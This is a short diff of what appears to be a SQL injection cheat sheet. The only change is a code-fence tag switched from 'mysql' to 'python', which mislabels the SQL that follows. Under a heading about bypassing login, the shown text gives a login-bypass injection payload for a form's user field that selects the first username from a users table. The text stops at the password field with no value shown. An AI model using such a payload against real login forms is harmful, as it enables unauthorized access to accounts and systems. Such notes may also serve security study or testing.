@@ -1,5 +1,5 @@
 Getting top user and bypassing login (easy)
-```mysql
+```python
 # User field
 ' OR username = (SELECT TOP 1 username FROM users) --
 # Pass field
